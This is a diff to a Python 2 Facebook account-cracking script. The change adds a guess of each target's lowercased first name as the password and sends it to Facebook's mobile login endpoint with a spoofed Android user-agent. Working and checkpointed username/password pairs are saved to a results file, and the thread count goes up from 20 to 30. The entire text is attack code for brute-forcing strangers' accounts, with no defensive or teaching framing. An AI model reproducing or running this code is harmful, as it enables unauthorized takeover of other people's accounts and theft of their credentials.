@@ -337,16 +337,33 @@ def pilih_passxd():
                                                     							cek.write('\n[CP] '+user+' | '+pass5+' | '+bt)
                                                     							cek.close()
                                                     							cekpoint.append(user+pass5)
+												else:
+                                            								pass6 = b['first_name'].lower()
+                                            								rex = requests.post("https://mbasic.facebook.com/login.php", data = {"email" : user, "pass" : pass6, "login" : "submit"}, headers = {"user-agent" : "Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36[FBAN/EMA;FBLC/it_IT;FBAV/239.0.0.10.109;]"})
+                                            								xo = rex.content
+                                            								if 'mbasic_logout_button' in xo or 'save-device' in xo:
+                                               						 			print '\033[1;97m   [OK]\033[1;97m '+user+' \033[1;97m| \033[1;97m'+pass6+' | '+bt
+                                                								oke = open('done/Indo.txt', 'a')
+                                                								oke.write('\n[OK] '+user+' | '+pass6+' | '+bt)
+                                                								oke.close()
+                                                								oks.append(user+pass6)
+                                            								else:
+                                                								if 'checkpoint' in xo:
+                                                    									print '\033[1;97m   [CP]\033[1;97m '+user+' \033[1;97m|\033[1;97m '+pass6+' | '+bt
+                                                    									cek = open('done/Indo.txt', 'a')
+                                                    									cek.write('\n[CP] '+user+' | '+pass6+' | '+bt)
+                                                    									cek.close()
+                                                    									cekpoint.append(user+pass6)
 								
-        except:
+        	except:
 			pass
-	p = ThreadPool(20)
+	p = ThreadPool(30)
 	p.map(main, id)
 	print ("\n   [•] Crack Finished")
 	print "   [•] Total OK/CP: "+str(len(oks))+"/"+str(len(cekpoint))
-	print ("   [•] File Saved At : done/crack.txt")
+	print ("   [•] File Saved At : done/Indo.txt")
 	raw_input("   [ Back ]")
-	os.system("python2 fbcrack.py")
+	os.system("python2 crackfb3.py")
 	menu()
 			
 if __name__ == '__main__':
